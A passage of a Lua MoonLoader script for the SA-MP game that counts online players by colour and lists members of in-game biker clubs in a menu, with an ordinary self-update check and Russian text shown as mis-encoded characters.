    while not isSampAvailable() do wait(0) end
    update(
      "https://raw.githubusercontent.com/Mafizik/script/main/Test_Update_for_bikerlist.json",
      "[" .. string.upper(thisScript().name) .. "]: ",
      "http://qrlk.me/sampvk",
      "camhackwwlog"
    )
    openchangelog("camhackwwlog", "http://qrlk.me/sampvk")    
    sampAddChatMessage("{1a9614}[BikerList by ARBUZYAN] {ffffff}Ńęđčďň óńďĺříî çŕăđóćĺí!", -1)
    sampAddChatMessage("{1a9614}[BikerList by ARBUZYAN] {ffffff}Âń˙ číôîđěŕöč˙ - /bikerlist menu", -1)

    sampRegisterChatCommand('bikerlist', function(arg)
      if protection then
      if ini.settings.bikerlit_komanda == 'bikerlist' then
      if arg == 'menu' or arg == 'Menu' or arg == 'MEnu' or arg == 'MENu' or arg == 'MENU' or arg == 'mENU' or arg == 'meNU' or arg == 'menU' then
        menu[0] = not menu[0]
      else
        window[0] = not window[0];
      end
  else
      if ini.settings.bikerlit_komanda ~= 'bikerlist' then
          if arg == 'menu' or arg == 'Menu' or arg == 'MEnu' or arg == 'MENu' or arg == 'MENU' or arg == 'mENU' or arg == 'meNU' or arg == 'menU' then
            menu[0] = not menu[0]
          end
      end
  end
end
  end)
  if ini.settings.bikerlit_komanda ~= 'bikerlist' then
      sampRegisterChatCommand(''..ini.settings.bikerlit_komanda, function()
        if protection then
        window[0] = not window[0];
        end
      end)
    end
    _, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
    nick = sampGetPlayerNickname(id)
    lua_thread.create(BikerList)
   lua_thread.create(BikerLists)
    lua_thread.create(sietomory)
    lua_thread.create(bikerlisthelpersi)
    lua_thread.create(antibag)
    lua_thread.create(frozens)
    lua_thread.create(zachettam)
end
function colors_for_menu()
  while true do wait(0)
  if ini.settings.save_color ~= 0 then
    helper_for_colors_for_menu()
  end
end
end
function helper_for_colors_for_menu()
  ini.settings.save_color = ini.settings.save_color
end
function zachettam()
  while true do wait(0)
  if helpformaf and not info[0] then
    menu[0] = true
    helpformaf = false
  end
  if dekhelpformaf and not komanda[0] then
    menu[0] = true
    dekhelpformaf = false
  end
  if dekhelpformafdi and not keygey[0] then
    menu[0] = true
    dekhelpformafdi = false
  end
  if heplerformenucolors and not colorsmenu[0] then
    menu[0] = true
    heplerformenucolors = false
  end
  if Helperforhelperforhelperforcolor and not colorheplersmenu[0] then
    menu[0] = true
    Helperforhelperforhelperforcolor = false
  end
end
end
function sietomory()
    while true do
        wait(500)
    if (active[0]) then
        sampAddChatMessage(u8:decode(ffi.string(text)), -1);
    end
end
end -- ôóíęöč˙ âűâîäčň ěĺíţ ń ěĺěáĺđńîě áŕéęĺđîâ
  function helperforallbikerlist() -- ôóíęöč˙ âűâîäčň ěĺíţ ń ěĺěáĺđńîě áŕéęĺđîâ
    local Kolvoplayer = nil
              local texts = btexts[1]
              for i = 1, #bclists[1] do
                local online = 0
                for l = 0, 1004 do
                  if sampIsPlayerConnected(l) then
                    if sampGetPlayerColor(l) == bclists[1][i] then online = online + 1 end
                  end
                end
                texts = texts:gsub('$CLR', ('%06X'):format(bit.band(bclists[1][i], 0xFFFFFF)), 1)
                texts = texts:gsub('$CNT', online, 1)		
                Kolvoplayer = texts:gsub('$CNT', online, 1)		
              end 
              local Online_VFRIKAH = nil
             local fricherrikihibabcd = Fri_kartoshka[1]
            for i = 1, #bclistsi[1] do
          local gidroelectrostantion = 0
          for l = 0, 1004 do
          if sampIsPlayerConnected(l) then
          if sampGetPlayerColor(l) == bclistsi[1][i] then gidroelectrostantion = gidroelectrostantion + 1 end
          end
          end
          fricherrikihibabcd = fricherrikihibabcd:gsub('$CLR', ('%06X'):format(bit.band(bclistsi[1][i], 0xFFFFFF)), 1)
          fricherrikihibabcd = fricherrikihibabcd:gsub('$CNT', gidroelectrostantion, 1)		
          Online_VFRIKAH = fricherrikihibabcd:gsub('$CNT', gidroelectrostantion, 1)		
          end 
          
  local ONLINE_HAMC = nil
  local hamcrikihibabcd = HAMSIBYBYBYBYBLEK[1]
  for i = 1, #bclistshg[1] do
    local kabarybabbasisjgsag = 0
    for l = 0, 1004 do
      if sampIsPlayerConnected(l) then
        if sampGetPlayerColor(l) == bclistshg[1][i] then kabarybabbasisjgsag = kabarybabbasisjgsag + 1 end
      end
    end
    hamcrikihibabcd = hamcrikihibabcd:gsub('$CLR', ('%06X'):format(bit.band(bclistshg[1][i], 0xFFFFFF)), 1)
    hamcrikihibabcd = hamcrikihibabcd:gsub('$CNT', kabarybabbasisjgsag, 1)		
    ONLINE_HAMC = hamcrikihibabcd:gsub('$CNT', kabarybabbasisjgsag, 1)		
  end 
  local WARLOKOONLINE = nil
  local skjpwolawethds = WARLOCKSMCBYBER[1]
  for i = 1, #warlokoidclistifds[1] do
    local ajhlkdjfajhafafgwr = 0
    for l = 0, 1004 do
      if sampIsPlayerConnected(l) then
        if sampGetPlayerColor(l) == warlokoidclistifds[1][i] then ajhlkdjfajhafafgwr = ajhlkdjfajhafafgwr + 1 end
      end
    end
    skjpwolawethds = skjpwolawethds:gsub('$CLR', ('%06X'):format(bit.band(warlokoidclistifds[1][i], 0xFFFFFF)), 1)
    skjpwolawethds = skjpwolawethds:gsub('$CNT', ajhlkdjfajhafafgwr, 1)		
    WARLOKOONLINE = skjpwolawethds:gsub('$CNT', ajhlkdjfajhafafgwr, 1)		
  end 
  local SOSONLINE = nil
  local skjpwolawethdseh = SOSIAFAGFAHV[1]
  for i = 1, #sosiclblrks[1] do
    local ajhlkdjfajhafafgwrer = 0
    for l = 0, 1004 do
      if sampIsPlayerConnected(l) then
        if sampGetPlayerColor(l) == sosiclblrks[1][i] then ajhlkdjfajhafafgwrer = ajhlkdjfajhafafgwrer + 1 end
      end
    end
    skjpwolawethdseh = skjpwolawethdseh:gsub('$CLR', ('%06X'):format(bit.band(sosiclblrks[1][i], 0xFFFFFF)), 1)
    skjpwolawethdseh = skjpwolawethdseh:gsub('$CNT', ajhlkdjfajhafafgwrer, 1)		
    SOSONLINE = skjpwolawethdseh:gsub('$CNT', ajhlkdjfajhafafgwrer, 1)		
  end 
  local HIGHONLINE = nil
  local bebebehejrtrsfsh = HIGHAFAGFAHV[1]
  for i = 1, #highclblrks[1] do
    local ajhafafgwr = 0
    for l = 0, 1004 do
      if sampIsPlayerConnected(l) then
        if sampGetPlayerColor(l) == highclblrks[1][i] then ajhafafgwr = ajhafafgwr + 1 end
      end
    end
    bebebehejrtrsfsh = bebebehejrtrsfsh:gsub('$CLR', ('%06X'):format(bit.band(highclblrks[1][i], 0xFFFFFF)), 1)
    bebebehejrtrsfsh = bebebehejrtrsfsh:gsub('$CNT', ajhafafgwr, 1)		
    HIGHONLINE = bebebehejrtrsfsh:gsub('$CNT', ajhafafgwr, 1)
  end 
  local VAGOSONLINE = nil
  local pagansclspilisygt = VAGOSAFAGFAHV[1]
  for i = 1, #vagosclblrks[1] do
    local pagantrklasfdlkwqeoiuy = 0
    for l = 0, 1004 do
      if sampIsPlayerConnected(l) then
        if sampGetPlayerColor(l) == vagosclblrks[1][i] then pagantrklasfdlkwqeoiuy = pagantrklasfdlkwqeoiuy + 1 end
      end
    end
    pagansclspilisygt = pagansclspilisygt:gsub('$CLR', ('%06X'):format(bit.band(sosiclblrks[1][i], 0xFFFFFF)), 1)
    pagansclspilisygt = pagansclspilisygt:gsub('$CNT', pagantrklasfdlkwqeoiuy, 1)		
    VAGOSONLINE = pagansclspilisygt:gsub('$CNT', pagantrklasfdlkwqeoiuy, 1)		
  end 
  local PAGANSONLINE = nil
  local paganlkgsjhlsafglslfv = PAGANSAFAGFAHV[1]
  for i = 1, #pagansclblrks[1] do
    local pagansstantiondgh = 0
    for l = 0, 1004 do
      if sampIsPlayerConnected(l) then
        if sampGetPlayerColor(l) == pagansclblrks[1][i] then pagansstantiondgh = pagansstantiondgh + 1 end
      end
    end
    paganlkgsjhlsafglslfv = paganlkgsjhlsafglslfv:gsub('$CLR', ('%06X'):format(bit.band(highclblrks[1][i], 0xFFFFFF)), 1)
    paganlkgsjhlsafglslfv = paganlkgsjhlsafglslfv:gsub('$CNT', pagansstantiondgh, 1)		
    PAGANSONLINE = paganlkgsjhlsafglslfv:gsub('$CNT', pagansstantiondgh, 1)		
  end 
  local MONGOLSONLINE = nil
  local mongolchurekhshsd = MONGOLSAFAGFAHV[1]
  for i = 1, #mongolsclblrks[1] do
    local mongolebatidyraksyka = 0
    for l = 0, 1004 do
      if sampIsPlayerConnected(l) then
        if sampGetPlayerColor(l) == mongolsclblrks[1][i] then mongolebatidyraksyka = mongolebatidyraksyka + 1 end
      end
    end
    mongolchurekhshsd = mongolchurekhshsd:gsub('$CLR', ('%06X'):format(bit.band(mongolsclblrks[1][i], 0xFFFFFF)), 1)
    mongolchurekhshsd = mongolchurekhshsd:gsub('$CNT', mongolebatidyraksyka, 1)		
    MONGOLSONLINE = mongolchurekhshsd:gsub('$CNT', mongolebatidyraksyka, 1)		
  end 
  local BANDIDOSONLINE = nil
  local pagankaepdtagchurekhshsd = BANDIDOSAFAGFAHV[1]
  for i = 1, #bandidosclblrks[1] do
    local bandodisepkfdstapon = 0
    for l = 0, 1004 do
      if sampIsPlayerConnected(l) then
        if sampGetPlayerColor(l) == bandidosclblrks[1][i] then bandodisepkfdstapon = bandodisepkfdstapon + 1 end
      end
    end
    pagankaepdtagchurekhshsd = pagankaepdtagchurekhshsd:gsub('$CLR', ('%06X'):format(bit.band(bandidosclblrks[1][i], 0xFFFFFF)), 1)
    pagankaepdtagchurekhshsd = pagankaepdtagchurekhshsd:gsub('$CNT', bandodisepkfdstapon, 1)		
    BANDIDOSONLINE = pagankaepdtagchurekhshsd:gsub('$CNT', bandodisepkfdstapon, 1)		
  end 
            local pidorassyka = nil      
            local ONLINESOUTLAWS = nil   
              local outputiks = "Organization                                   Nickname"
              for id = 0, 1000 do
               if sampIsPlayerConnected(id) and sampGetPlayerColor(id) == 2864035253 then 
                 outputs = ("%s{A9A9A9}Outlaws MC{FFFFFF}                                     %s [%s]\n"):format(outputs, sampGetPlayerNickname(id), id) -- ,     --  2864035253     
               --  outputs = 'nil' 
              end
              local ONLINESWARLOCKS = nil
              local warlokohelpers = nil
               if sampIsPlayerConnected(id) and sampGetPlayerColor(id) == 2867754529 then 
                  dolsyao = ("%s{E17F14}Warlocks MC{FFFFFF}                                   %s [%s]\n"):format(dolsyao, sampGetPlayerNickname(id), id)
         
                end
                local ONLINESSOS = nil
                local sosperenos = nil
                if sampIsPlayerConnected(id) and sampGetPlayerColor(id) == 2861253888 then 
                 outputsi = ("%s{9E4F00}Sons of Silence MC{FFFFFF}                          %s [%s]\n"):format(outputsi, sampGetPlayerNickname(id), id) 
                end
                local ONLINESFRIKI = nil
               local frikilocheri = nil
              if sampIsPlayerConnected(id) and sampGetPlayerColor(id) == 2853195403 then 
                outputsik = ("%s{0F3757}Free Souls MC{FFFFFF}                                 %s [%s]\n"):format(outputsik, sampGetPlayerNickname(id), id) --
                end
                local ONLINESBANDIDOS = nil
                local bandidosperenos = nil
                if sampIsPlayerConnected(id) and sampGetPlayerColor(id) == 2868880640 then 
                 dolfin = ("%s{F3A505}Bandidos MC {FFFFFF}                                   %s [%s]\n"):format(dolfin, sampGetPlayerNickname(id), id) 
               end
               local ONLINESHIGH = nil
               local highperenos = nil
                if sampIsPlayerConnected(id) and sampGetPlayerColor(id) == 2853113615 then 
                  outputik = ("%s{333234}Highwayman MC {FFFFFF}                             %s [%s]\n"):format(outputik, sampGetPlayerNickname(id), id)
                end
                  local ONLINESVAGOS = nil
               local vagosperenos = nil
               if sampIsPlayerConnected(id) and sampGetPlayerColor(id) == 2852162304 then 
                doldik = ("%s{218108}Vagos MC {FFFFFF}                                        %s [%s]\n"):format(doldik, sampGetPlayerNickname(id), id)
               end
               local ONLINESPAGANS = nil
               local pagansperenos = nil
                if sampIsPlayerConnected(id) and sampGetPlayerColor(id) == 2852126859 then 
                  doldike = ("%s{2B2AA7}Pagans MC {FFFFFF}                                      %s [%s]\n"):format(doldike, sampGetPlayerNickname(id), id) 
                end
                local ONLINESMONGOLS = nil
                local mongolspereson = nil
                if sampIsPlayerConnected(id) and sampGetPlayerColor(id) == 2853968924 then 
                 doldi = ("%s{404040}Mongols MC {FFFFFF}                                    %s [%s]\n"):format(doldi, sampGetPlayerNickname(id), id) 
                end
                local ONLINESHAMC = nil
                local hamccheri = nil
                if sampIsPlayerConnected(id) and sampGetPlayerColor(id) == 2863800866 then 
                dold = ("%s{8B0000}Hells Angels MC {FFFFFF}                            %s [%s]\n"):format(dold, sampGetPlayerNickname(id), id)
              end
            end
           --  if outputik == nil then
           --   outputik = ''
            -- Kolvoplayer = ''
           --  warlocheri = ''
           --  end          
            if outputsi == nil then
              outputsi = ''
            end
            if outputs == nil then
              outputs = ''
            end
            if output == nil then
              output = ''
            end
            if outputsik == nil then
              outputsik = ''
            end
            if doldik == nil then
              doldik = ''
            end
            if doldike == nil then
              doldike = ''
            end
            if doldi == nil then
              doldi = ''
            end
            if dold == nil then
              dold = ''
            end
            if dolfin == nil then
              dolfin = ''
            end
            if dolsyao == nil then
              dolsyao = ''
            end 
            if Online_VFRIKAH == nil then
              Online_VFRIKAH = ''
            end            
            if frikilocheri == nil then
              frikilocheri = ''
            end   
              if Kolvoplayers == nil then
                Kolvoplayers = ''
              end            
              if pidorassyka == nil then
                pidorassyka = ''
              end
              if hamccheri == nil then
                hamccheri = '\n'
                ONLINESHAMC = '\n '
             end
              if outputsik == '' then
                Online_VFRIKAH = ''
              end
              if outputs == '' then
                Kolvoplayer = ''
              end
              if dold == '' then
                ONLINE_HAMC = ''
              end
              if hamccheri == '\n' and dold == '' then
                hamccheri = ''
                ONLINESHAMC = ''
              end
              if frikilocheri == nil then
                frikilocheri = '\n'
                ONLINESFRIKI = '\n '
              end
              if frikilocheri == '\n' and outputsik == '' then
                frikilocheri = ''
                ONLINESFRIKI = ''
              end
              if ONLINESBANDIDOS == nil then
                ONLINESBANDIDOS = '\n '
              end
              if ONLINESWARLOCKS == nil then
                ONLINESWARLOCKS = '\n '
              end
              if ONLINESHAMC == nil then
                ONLINE_HAMC = '\n '
              end
              if ONLINESHIGH == nil then
                ONLINESHIGH = '\n '
              end
              if ONLINESMONGOLS == nil then
                ONLINESMONGOLS = '\n '
              end
              if ONLINESWARLOCKS == nil then
                ONLINESWARLOCKS = '\n '
              end
              if ONLINESVAGOS == nil then
                ONLINESVAGOS = '\n '
              end
              if ONLINESSOS == nil then
                ONLINESSOS = '\n '
              end
              if pidorassyka == nil then
                pidorassyka = '\n'
                ONLINESOUTLAWS = '\n '
              end
              if ONLINESOUTLAWS == nil then
                ONLINESOUTLAWS = '\n '
            end            
            if ONLINESFRIKI == nil then
              ONLINESFRIKI = '\n '
            end
              if pidorassyka == '\n' and outputs == '' then
                pidorassyka = ''
                ONLINESOUTLAWS = ''
              end
  
            if warlokohelpers == nil then
              warlokohelpers = '\n'
              ONLINESWARLOCKS = '\n '
            end
            if dolsyao == '' and warlokohelpers == '\n' then
              warlokohelpers = ''
              ONLINESWARLOCKS = ''
            end
            if dolsyao == '' then
              WARLOKOONLINE = ''
            end
            if outputik == '' then
              HIGHONLINE = ''
            end
            if sosperenos == nil then
              sosperenos = '\n'
              ONLINESSOS = '\n '
            end
            if outputik == '' then
              HIGHONLINE = ''
            end
            if outputsi == '' and sosperenos == '\n' then
                sosperenos = ''
                ONLINESSOS = ''
            end
            if outputsi == '' then
              SOSONLINE = ''
            end
            if highperenos == nil then
              highperenos = '\n'
              ONLINESHIGH = '\n '
            end
            if highperenos == '\n' and outputik == '' then
              highperenos = ''
              HIGHONLINE = ''
              ONLINESHIGH = ''
            end
            if doldike == '' then
              PAGANSONLINE = ''
            end
            if pagansperenos == nil then
              pagansperenos = '\n'
              ONLINESPAGANS = '\n '
            end
            if pagansperenos == '\n' and doldike == '' then
              pagansperenos = ''
              ONLINESPAGANS = ''
            end
            if doldik == '' then
              VAGOSONLINE = ''
            end
            if vagosperenos == nil then
              vagosperenos = '\n'
              ONLINESVAGOS = '\n '
            end
            if vagosperenos == '\n' and doldik == '' then
              vagosperenos = ''
              ONLINESVAGOS = ''
            end
            if doldi == '' then
              MONGOLSONLINE = ''
            end
            if mongolsperenos == nil then
              mongolsperenos = '\n'
              ONLINESMONGOLS = '\n '
            end
            if mongolsperenos == '\n' and doldi == '' then
              mongolsperenos = ''
              ONLINESMONGOLS = ''
            end
            if dolfin == '' then
              BANDIDOSONLINE = ''
            end
            if bandidosperenos == nil then
              bandidosperenos = '\n'
              ONLINESBANDIDOS = '\n '
            end
            if bandidosperenos == '\n' and dolfin == '' then
              bandidosperenos = ''
              ONLINESBANDIDOS = ''
            end
            if ONLINE_HAMC == 'Îíëŕéí: 2' or ONLINE_HAMC == 'Îíëŕéí: 1' or ONLINE_HAMC == 'Îíëŕéí: 0' then
              ONLINE_HAMC = ''
              hamccheri = ''
              ONLINESHAMC = ''
           -- else
           --   ONLINESHAMC = '\n '
           --   hamccheri = '\n'
            end
            if BANDIDOSONLINE == 'Îíëŕéí: 2' or BANDIDOSONLINE == 'Îíëŕéí: 1' or BANDIDOSONLINE == 'Îíëŕéí: 0' then
              BANDIDOSONLINE = ''
              bandidosperenos = ''
            ONLINESBANDIDOS = ''
           -- else
          --    ONLINESBANDIDOS = '\n '
           --   bandidosperenos = '\n'
            end
            if MONGOLSONLINE == 'Îíëŕéí: 2' or MONGOLSONLINE == 'Îíëŕéí: 1' or MONGOLSONLINE == 'Îíëŕéí: 0' then
              MONGOLSONLINE = ''
              mongolsperenos = ''
              ONLINESMONGOLS = ''
            --else
            --  ONLINESMONGOLS = '\n '
         --     mongolsperenos = '\n'
            end
            if PAGANSONLINE == 'Îíëŕéí: 2' or PAGANSONLINE == 'Îíëŕéí: 1' or PAGANSONLINE == 'Îíëŕéí: 0' then
              PAGANSONLINE = ''
              pagansperenos = ''
              ONLINESPAGANS = ''
            end
            if VAGOSONLINE == 'Îíëŕéí: 2' or VAGOSONLINE == 'Îíëŕéí: 1' or VAGOSONLINE == 'Îíëŕéí: 0' then
              VAGOSONLINE = ''
              vagosperenos = ''
              ONLINESVAGOS = ''
           else
            vagosperenos = '\n'
            end
            if Online_VFRIKAH == 'Îíëŕéí: 2' or Online_VFRIKAH == 'Îíëŕéí: 1' or Online_VFRIKAH == 'Îíëŕéí: 0'  then
              Online_VFRIKAH = ''
              frikilocheri = ''
              ONLINESFRIKI = ''
          -- else
            --  ONLINESFRIKI = '\n '
         --     frikilocheri = '\n'
            end
            if Kolvoplayer == 'Îíëŕéí: 2' or Kolvoplayer == 'Îíëŕéí: 1' or Kolvoplayer == 'Îíëŕéí: 0' then
              Kolvoplayer = ''
              pidorassyka = ''
              ONLINESOUTLAWS = ''
           -- else
            --  pidorassyka = '\n'
            end
            if WARLOKOONLINE == 'Îíëŕéí: 2' or WARLOKOONLINE == 'Îíëŕéí: 1' or WARLOKOONLINE == 'Îíëŕéí: 0' then
              WARLOKOONLINE = ''
              warlokohelpers = ''
              ONLINESWARLOCKS = ''
        --    else
           --   ONLINESWARLOCKS = '\n '
           --   warlokohelpers = '\n'
            end
            if SOSONLINE == 'Îíëŕéí: 2' or SOSONLINE == 'Îíëŕéí: 1' or SOSONLINE == 'Îíëŕéí: 0' then
              SOSONLINE = ''
              sosperenos = ''
              ONLINESSOS = ''
           -- else
            --  sosperenos = '\n'
            end
            if HIGHONLINE == 'Îíëŕéí: 2' or HIGHONLINE == 'Îíëŕéí: 1' or HIGHONLINE == 'Îíëŕéí: 0' then
              HIGHONLINE = ''
              highperenos = ''
              ONLINESHIGH = ''
          --  else
             -- ONLINESHIGH = '\n '
            --  highperenos = '\n'
            end
            if outputik == '' and ONLINESHIGH == '\n ' then
              ONLINESHIGH = ''
            end
            if outputs == '' and ONLINESOUTLAWS == '\n ' then
              ONLINESOUTLAWS = ''
            end
            if outputsi == '' and ONLINESSOS == '\n' then
              ONLINESSOS = ''
            end
            if dolfin == '' and ONLINESBANDIDOS == '\n ' then
              ONLINESBANDIDOS = ''
            end
            if outputsik == '' and ONLINESFRIKI == '\n ' then
              ONLINESFRIKI = ''
            end
            if doldik == '' and VAGOSONLINE == '\n ' then
              VAGOSONLINE = ''
            end
            if doldike == '' and ONLINESPAGANS == '\n ' then
              ONLINESPAGANS = ''
            end
            if dolsyao == '' and ONLINESWARLOCKS == '\n ' then
              ONLINESWARLOCKS = ''
            end
            if dold == '' and ONLINESHAMC == '\n ' then
              ONLINESHAMC = ''
            end
            if doldi == '' and ONLINESMONGOLS == '' then
              ONLINESMONGOLS = ''
            end
            if ONLINESHAMC == 'Îíëŕéí: 1' or ONLINESMONGOLS == 'Îíëŕéí: 1' or ONLINESFRIKI == 'Îíëŕéí: 1' then
              ONLINESWARLOCKS = ''
            end
         --   if WARLOKOONLINE == 'Îíëŕéí: 3' or WARLOKOONLINE == 'Îíëŕéí: 4' or WARLOKOONLINE == 'Îíëŕéí: 5' or WARLOKOONLINE == 'Îíëŕéí: 6' or WARLOKOONLINE == 'Îíëŕéí: 7' or WARLOKOONLINE == 'Îíëŕéí: 8' or WARLOKOONLINE == 'Îíëŕéí: 9' or WARLOKOONLINE == 'Îíëŕéí: 10' or WARLOKOONLINE == 'Îíëŕéí: 11' or WARLOKOONLINE == 'Îíëŕéí: 12' or WARLOKOONLINE == 'Îíëŕéí: 13' or WARLOKOONLINE == 'Îíëŕéí: 14' or WARLOKOONLINE == 'Îíëŕéí: 15' or WARLOKOONLINE == 'Îíëŕéí: 16' or WARLOKOONLINE == 'Îíëŕéí: 17' or WARLOKOONLINE == 'Îíëŕéí: 18' or WARLOKOONLINE == 'Îíëŕéí: 19' or WARLOKOONLINE == 'Îíëŕéí: 20' or WARLOKOONLINE == 'Îíëŕéí: 21' or WARLOKOONLINE == 'Îíëŕéí: 22' or WARLOKOONLINE == 'Îíëŕéí: 23' or WARLOKOONLINE == 'Îíëŕéí: 24' or WARLOKOONLINE == 'Îíëŕéí: 25' or WARLOKOONLINE == 'Îíëŕéí: 26' or WARLOKOONLINE == 'Îíëŕéí: 27' or WARLOKOONLINE == 'Îíëŕéí: 28' or WARLOKOONLINE == 'Îíëŕéí: 29' or WARLOKOONLINE == 'Îíëŕéí: 30' or WARLOKOONLINE == 'Îíëŕéí: 31' or WARLOKOONLINE == 'Îíëŕéí: 32' or WARLOKOONLINE == 'Îíëŕéí: 33' or WARLOKOONLINE == 'Îíëŕéí: 34' or WARLOKOONLINE == 'Îíëŕéí: 35' then
          --     if doldik ~= '' then
          --    ONLINESVAGOS = '\n '
            --end
          --  end
              local mafizikcha = ''
            if outputs == '' and outputik == '' and dolfin == '' and doldik == '' and dolsyao == '' and dold == '' and doldi == '' and outputsi == '' and outputsik == '' and doldike == '' then
              mafizikcha = 'Áŕéęĺđîâ íĺň â ńĺňč.'
            else
              mafizikcha = ''
            end
      --      ONLINESMONGOLS = ''
      --sampAddChatMessage('11'..BANDIDOSONLINE..'12')
      --pagansperenos = ''
      
      imgui.TextColoredRGB(u8(outputsi..mafizikcha ..SOSONLINE..sosperenos..dold..ONLINE_HAMC..hamccheri.. outputik..HIGHONLINE..highperenos..outputsik .. Online_VFRIKAH..frikilocheri..dolsyao..WARLOKOONLINE..warlokohelpers..dolfin..BANDIDOSONLINE..bandidosperenos..outputs..Kolvoplayer..pidorassyka.. doldi..MONGOLSONLINE..mongolsperenos ..doldike  ..PAGANSONLINE..pagansperenos ..doldik .. VAGOSONLINE..vagosperenos)) 
          outputik = nil
          outputs = nil
              outputsi = nil
              outputsik = nil
              dolsyao = nil
              dold = nil
              doldike = nil
              doldik = nil
              dolfin = nil
              doldi = nil
              Kolvoplayer = nil
              Online_VFRIKAH = nil
              mafizikcha = nil
  end

  function BikerList()
    while true do wait(0)
               --  if outputik == nil then
           --   outputik = ''
            -- Kolvoplayer = ''
           --  warlocheri = ''
           --  end          
           if outputsi == nil then
            outputsi = ''
          end
          if outputs == nil then
            outputs = ''
          end
          if output == nil then
            output = ''
          end
          if outputsik == nil then
            outputsik = ''
          end
          if doldik == nil then
            doldik = ''
          end
          if doldike == nil then
            doldike = ''
          end
          if doldi == nil then
            doldi = ''
          end
          if dold == nil then
            dold = ''
          end
          if dolfin == nil then
            dolfin = ''
          end
          if dolsyao == nil then
            dolsyao = ''
          end 
          if Online_VFRIKAH == nil then
            Online_VFRIKAH = ''
          end            
          if frikilocheri == nil then
            frikilocheri = ''
          end   
            if Kolvoplayers == nil then
              Kolvoplayers = ''
            end            
            if pidorassyka == nil then
              pidorassyka = ''
            end
            if hamccheri == nil then
              hamccheri = '\n'
              ONLINESHAMC = '\n '
           end
            if outputsik == '' then
              Online_VFRIKAH = ''
            end
            if outputs == '' then
              Kolvoplayer = ''
            end
            if dold == '' then
              ONLINE_HAMC = ''
            end
            if hamccheri == '\n' and dold == '' then
              hamccheri = ''
              ONLINESHAMC = ''
            end
            if frikilocheri == nil then
              frikilocheri = '\n'
              ONLINESFRIKI = '\n '
            end
            if frikilocheri == '\n' and outputsik == '' then
              frikilocheri = ''
              ONLINESFRIKI = ''
            end
            if ONLINESBANDIDOS == nil then
              ONLINESBANDIDOS = '\n '
            end
            if ONLINESWARLOCKS == nil then
              ONLINESWARLOCKS = '\n '
            end
            if ONLINESHAMC == nil then
              ONLINE_HAMC = '\n '
            end
            if ONLINESHIGH == nil then
              ONLINESHIGH = '\n '
            end
            if ONLINESMONGOLS == nil then
              ONLINESMONGOLS = '\n '
            end
            if ONLINESWARLOCKS == nil then
              ONLINESWARLOCKS = '\n '
            end
            if ONLINESVAGOS == nil then
              ONLINESVAGOS = '\n '
            end
            if ONLINESSOS == nil then
              ONLINESSOS = '\n '
            end
            if pidorassyka == nil then
              pidorassyka = '\n'
              ONLINESOUTLAWS = '\n '
            end
            if ONLINESOUTLAWS == nil then
              ONLINESOUTLAWS = '\n '
          end            
          if ONLINESFRIKI == nil then
            ONLINESFRIKI = '\n '
          end
            if pidorassyka == '\n' and outputs == '' then
              pidorassyka = ''
              ONLINESOUTLAWS = ''
            end

          if warlokohelpers == nil then
            warlokohelpers = '\n'
            ONLINESWARLOCKS = '\n '
          end
          if dolsyao == '' and warlokohelpers == '\n' then
            warlokohelpers = ''
            ONLINESWARLOCKS = ''
          end
          if dolsyao == '' then
            WARLOKOONLINE = ''
          end
          if outputik == '' then
            HIGHONLINE = ''
          end
          if sosperenos == nil then
            sosperenos = '\n'
            ONLINESSOS = '\n '
          end
          if outputik == '' then
            HIGHONLINE = ''
          end
          if outputsi == '' and sosperenos == '\n' then
              sosperenos = ''
              ONLINESSOS = ''
          end
          if outputsi == '' then
            SOSONLINE = ''
          end
          if highperenos == nil then
            highperenos = '\n'
            ONLINESHIGH = '\n '
          end
          if highperenos == '\n' and outputik == '' then
            highperenos = ''
            HIGHONLINE = ''
            ONLINESHIGH = ''
          end
          if doldike == '' then
            PAGANSONLINE = ''
          end
          if pagansperenos == nil then
            pagansperenos = '\n'
            ONLINESPAGANS = '\n '
          end
          if pagansperenos == '\n' and doldike == '' then
            pagansperenos = ''
            ONLINESPAGANS = ''
          end
          if doldik == '' then
            VAGOSONLINE = ''
          end
          if vagosperenos == nil then
            vagosperenos = '\n'
            ONLINESVAGOS = '\n '
          end
          if vagosperenos == '\n' and doldik == '' then
            vagosperenos = ''
            ONLINESVAGOS = ''
          end
          if doldi == '' then
            MONGOLSONLINE = ''
          end
          if mongolsperenos == nil then
            mongolsperenos = '\n'
            ONLINESMONGOLS = '\n '
          end
          if mongolsperenos == '\n' and doldi == '' then
            mongolsperenos = ''
            ONLINESMONGOLS = ''
          end
          if dolfin == '' then
            BANDIDOSONLINE = ''
          end
          if bandidosperenos == nil then
            bandidosperenos = '\n'
            ONLINESBANDIDOS = '\n '
          end
          if bandidosperenos == '\n' and dolfin == '' then
            bandidosperenos = ''
            ONLINESBANDIDOS = ''
          end
          if ONLINE_HAMC == u8'Îíëŕéí: 2' or ONLINE_HAMC == u8'Îíëŕéí: 1' or ONLINE_HAMC == u8'Îíëŕéí: 0' then
            ONLINE_HAMC = ''
            hamccheri = ''
            ONLINESHAMC = ''
          else
            ONLINESHAMC = '\n '
            hamccheri = '\n'
          end
          if BANDIDOSONLINE == 'Îíëŕéí: 2' or BANDIDOSONLINE == 'Îíëŕéí: 1' or BANDIDOSONLINE == 'Îíëŕéí: 0' then
            BANDIDOSONLINE = ''
            bandidosperenos = ''
          ONLINESBANDIDOS = ''
          else
            ONLINESBANDIDOS = '\n '
            bandidosperenos = '\n'
          end
          if MONGOLSONLINE == u8'Îíëŕéí: 2' or MONGOLSONLINE == u8'Îíëŕéí: 1' or MONGOLSONLINE == u8'Îíëŕéí: 0'  then
            MONGOLSONLINE = ''
            mongolsperenos = ''
            ONLINESMONGOLS = ''
          else
          --  ONLINESMONGOLS = '\n '
            mongolsperenos = '\n'
          end
          if PAGANSONLINE == 'Îíëŕéí: 2' or PAGANSONLINE == 'Îíëŕéí: 1' or PAGANSONLINE == 'Îíëŕéí: 0' then
            PAGANSONLINE = ''
            pagansperenos = ''
            ONLINESPAGANS = ''
          else
            ONLINESPAGANS = '\n '
            pagansperenos = '\n'
          end
          if VAGOSONLINE == u8'Îíëŕéí: 2' or VAGOSONLINE == u8'Îíëŕéí: 1' or VAGOSONLINE == u8'Îíëŕéí: 0' then
            VAGOSONLINE = ''
            vagosperenos = ''
            ONLINESVAGOS = ''
       --   else
       --     ONLINESVAGOS = '\n '
          end
          if Online_VFRIKAH == u8'Îíëŕéí: 2' or Online_VFRIKAH == u8'Îíëŕéí: 1' or Online_VFRIKAH == u8'Îíëŕéí: 0'  then
            Online_VFRIKAH = ''
            frikilocheri = ''
            ONLINESFRIKI = ''
          else
            ONLINESFRIKI = '\n '
